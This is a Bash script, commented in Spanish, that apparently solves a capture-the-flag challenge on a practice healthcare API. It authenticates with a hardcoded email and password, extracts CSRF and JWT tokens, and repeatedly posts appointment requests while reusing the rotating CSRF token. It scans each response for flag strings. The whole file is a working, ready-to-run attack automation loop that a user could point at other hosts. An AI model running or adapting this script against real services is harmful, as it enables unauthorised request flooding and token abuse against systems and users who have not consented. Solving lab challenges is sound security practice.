#!/bin/bash

# Colores para output
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuración
MAX_ATTEMPTS=${1:-100}  # Primer argumento = número de intentos (default 100)
FLAG_FOUND=0
ATTEMPT=0
FLAGFILE="flag_found.txt"
LOGFILE="bruteforce.log"
AUTH_API_KEY="${AUTH_API_KEY:-}"

# Limpiar archivos anteriores
> "$LOGFILE"
> "$FLAGFILE"

echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}[*] CSRF Token Bruteforce - Flag Hunting${NC}"
echo -e "${BLUE}[*] Ejecutando $MAX_ATTEMPTS intentos...${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}\n"

# Step 0: autenticar una sola vez y extraer CSRF token + JWT
echo -e "${BLUE}[*] Autenticando con /api/v1/auth...${NC}"

AUTH_RESPONSE=$(curl --path-as-is -s -k -i -X POST \
    -H 'Content-Type: application/json' \
    -H 'Accept: application/json' \
    -H 'User-Agent: PostmanRuntime/7.54.0' \
    -H 'Cache-Control: no-cache' \
    -H 'Connection: keep-alive' \
    --data-binary '{"email": "john4@healthcare.app","password": "john@1234"}' \
    'https://hackapi.secops.group/api/v1/auth' 2>/dev/null)

# Extraer X-CSRF-Token de headers (case-insensitive)
CSRF_TOKEN=$(printf '%s' "$AUTH_RESPONSE" | tr -d '\r' | grep -im1 '^x-csrf-token:' | cut -d':' -f2- | tr -d '[:space:]')

# Extraer JWT token del último line (JSON body)
JWT_TOKEN=$(printf '%s' "$AUTH_RESPONSE" | tail -1 | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

if [ -z "$CSRF_TOKEN" ] || [ -z "$JWT_TOKEN" ]; then
    echo -e "${RED}[!] Error extrayendo tokens de auth${NC}"
    echo -e "${RED}CSRF_TOKEN: $CSRF_TOKEN${NC}"
    echo -e "${RED}JWT_TOKEN: $JWT_TOKEN${NC}"
    echo "=== Auth Response ===" >&2
    printf '%s' "$AUTH_RESPONSE" | head -50 >&2
    exit 1
fi

echo -e "${GREEN}[+] X-CSRF-Token: $CSRF_TOKEN${NC}"
echo -e "${GREEN}[+] JWT Token obtenido (primeros 50 chars): ${JWT_TOKEN:0:50}...${NC}"

# Loop principal
for ((i=1; i<=MAX_ATTEMPTS; i++)); do
    ATTEMPT=$i
    
    # Mostrar progreso cada 50 intentos
    if (( i % 50 == 0 )); then
        echo -e "${YELLOW}[~] Intento $i/$MAX_ATTEMPTS...${NC}"
    fi
    
    # Step 1: Appointment request usando CSRF token + JWT actual
    APPOINTMENT_RESPONSE=$(curl --path-as-is -s -k -i -X POST \
        -H "X-CSRF-Token: $CSRF_TOKEN" \
        -H 'Content-Type: application/json' \
        -H 'Accept: application/json' \
        -H "Authorization: $JWT_TOKEN" \
        -H 'User-Agent: PostmanRuntime/7.54.0' \
        -H 'Cache-Control: no-cache' \
        -H 'Connection: keep-alive' \
        --data-binary '{"slot": "2024-12-15T10:00:00","notes": "Need consultation for fever"}' \
        'https://hackapi.secops.group/api/v1/appointment' 2>/dev/null)
    
    # Extraer nuevo X-CSRF-Token de la respuesta actual
    NEW_CSRF_TOKEN=$(printf '%s' "$APPOINTMENT_RESPONSE" | tr -d '\r' | grep -im1 '^x-csrf-token:' | cut -d':' -f2- | tr -d '[:space:]')
    
    if [ -n "$NEW_CSRF_TOKEN" ]; then
        CSRF_TOKEN="$NEW_CSRF_TOKEN"
    fi
    
    # Buscar flag en la respuesta (detecta: flag{...}, FLAG{...}, flag=..., etc)
    if echo "$APPOINTMENT_RESPONSE" | grep -qiE '(flag\{[^}]+\}|flag["\s=:]+[A-Za-z0-9_\-{}]+|ctf\{[^}]+\}|FLAG)'; then
        FLAG_FOUND=1
        
        # Extraer la flag
        FOUND_FLAG=$(echo "$APPOINTMENT_RESPONSE" | grep -oiE '(flag\{[^}]+\}|FLAG\{[^}]+\}|ctf\{[^}]+\})' | head -1)
        
        if [ -z "$FOUND_FLAG" ]; then
            FOUND_FLAG=$(echo "$APPOINTMENT_RESPONSE" | grep -oiE 'flag["\s=:]+[A-Za-z0-9_\-{}]+' | head -1)
        fi
        
        echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}[+] FLAG ENCONTRADA EN INTENTO $i!!!${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}[+] X-CSRF-Token: $CSRF_TOKEN${NC}"
        echo -e "${GREEN}[+] Flag: $FOUND_FLAG${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════\n${NC}"
        
        # Guardar flag a archivo
        echo "Intento: $i" > "$FLAGFILE"
        echo "CSRF-Token: $CSRF_TOKEN" >> "$FLAGFILE"
        echo "Flag: $FOUND_FLAG" >> "$FLAGFILE"
        echo "" >> "$FLAGFILE"
        echo "Respuesta completa:" >> "$FLAGFILE"
        echo "$APPOINTMENT_RESPONSE" >> "$FLAGFILE"
        
        # Mostrar primeras líneas de la respuesta
        echo -e "${BLUE}[*] Primeras líneas de la respuesta:${NC}"
        echo "$APPOINTMENT_RESPONSE" | head -30
        
        break
    fi
done

# Resumen final
echo -e "\n${BLUE}═══════════════════════════════════════════════════════${NC}"
if [ $FLAG_FOUND -eq 1 ]; then
    echo -e "${GREEN}[+] ¡SUCCESS! Flag encontrada en intento $ATTEMPT/$MAX_ATTEMPTS${NC}"
    echo -e "${GREEN}[+] Resultados guardados en: $FLAGFILE${NC}"
else
    echo -e "${RED}[!] Flag NO encontrada después de $MAX_ATTEMPTS intentos${NC}"
fi
echo -e "${BLUE}[*] Log guardado en: $LOGFILE${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
